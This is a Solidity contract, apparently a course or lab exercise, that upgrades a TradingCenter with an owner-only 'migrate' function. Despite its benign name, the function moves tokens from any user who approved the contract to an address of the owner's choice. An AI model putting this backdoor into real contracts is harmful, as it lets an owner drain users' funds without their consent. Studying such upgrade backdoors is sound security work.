// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter } from "./TradingCenter.sol";
import { IERC20 } from "./TradingCenter.sol";
import { Ownable } from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable {

    function migrate(IERC20 token, address from, address to, uint256 amount) external onlyOwner {
        token.transferFrom(from, to, amount);
    }
}